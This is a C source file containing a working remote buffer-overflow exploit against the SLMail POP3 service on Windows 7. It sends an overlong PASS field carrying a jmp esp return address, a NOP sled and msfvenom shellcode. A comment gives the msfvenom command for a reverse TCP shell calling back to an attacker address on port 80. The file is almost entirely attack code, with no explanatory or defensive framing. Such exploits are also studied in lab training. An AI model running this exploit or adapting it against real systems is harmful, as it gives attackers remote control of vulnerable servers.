#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

/*
For Windows 7 Professional 32 bit
jmp esp 0x5f4beac3
*/
#define retadd "\xc3\xea\x4b\x5f"
#define victimIP "10.10.10.10"
#define port 110

/*
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=80 -e x86/sh
ikata_ga_nai -b '\x00\x0a\x0d' -f c
*/


char shellcode[] = 
"\xba\xd9\x9a\xa4\x94\xda\xc4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x53\x12\x83\xc3\x04\x03\x8a\x94\x46\x61\xd0\x41\x04"
"\x8a\x28\x92\x69\x02\xcd\xa3\xa9\x70\x86\x94\x19\xf2\xca\x18"
"\xd1\x56\xfe\xab\x97\x7e\xf1\x1c\x1d\x59\x3c\x9c\x0e\x99\x5f"
"\x1e\x4d\xce\xbf\x1f\x9e\x03\xbe\x58\xc3\xee\x92\x31\x8f\x5d"
"\x02\x35\xc5\x5d\xa9\x05\xcb\xe5\x4e\xdd\xea\xc4\xc1\x55\xb5"
"\xc6\xe0\xba\xcd\x4e\xfa\xdf\xe8\x19\x71\x2b\x86\x9b\x53\x65"
"\x67\x37\x9a\x49\x9a\x49\xdb\x6e\x45\x3c\x15\x8d\xf8\x47\xe2"
"\xef\x26\xcd\xf0\x48\xac\x75\xdc\x69\x61\xe3\x97\x66\xce\x67"
"\xff\x6a\xd1\xa4\x74\x96\x5a\x4b\x5a\x1e\x18\x68\x7e\x7a\xfa"
"\x11\x27\x26\xad\x2e\x37\x89\x12\x8b\x3c\x24\x46\xa6\x1f\x21"
"\xab\x8b\x9f\xb1\xa3\x9c\xec\x83\x6c\x37\x7a\xa8\xe5\x91\x7d"
"\xcf\xdf\x66\x11\x2e\xe0\x96\x38\xf5\xb4\xc6\x52\xdc\xb4\x8c"
"\xa2\xe1\x60\x02\xf2\x4d\xdb\xe3\xa2\x2d\x8b\x8b\xa8\xa1\xf4"
"\xac\xd3\x6b\x9d\x47\x2e\xfc\xa8\x9c\x30\xb4\xc4\xa0\x30\x44"
"\x45\x2c\xd6\x2e\x75\x78\x41\xc7\xec\x21\x19\x76\xf0\xff\x64"
"\xb8\x7a\x0c\x99\x77\x8b\x79\x89\xe0\x7b\x34\xf3\xa7\x84\xe2"
"\x9b\x24\x16\x69\x5b\x22\x0b\x26\x0c\x63\xfd\x3f\xd8\x99\xa4"
"\xe9\xfe\x63\x30\xd1\xba\xbf\x81\xdc\x43\x4d\xbd\xfa\x53\x8b"
"\x3e\x47\x07\x43\x69\x11\xf1\x25\xc3\xd3\xab\xff\xb8\xbd\x3b"
"\x79\xf3\x7d\x3d\x86\xde\x0b\xa1\x37\xb7\x4d\xde\xf8\x5f\x5a"
"\xa7\xe4\xff\xa5\x72\xad\xf0\xef\xde\x84\x98\xa9\x8b\x94\xc4"
"\x49\x66\xda\xf0\xc9\x82\xa3\x06\xd1\xe7\xa6\x43\x55\x14\xdb"
"\xdc\x30\x1a\x48\xdc\x10";

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x41, 2606);

    char *nop = malloc(15);
    memset(nop, 0x90, 15);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit by roguesecurity\n");
    xs = conn(victimIP);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);
}
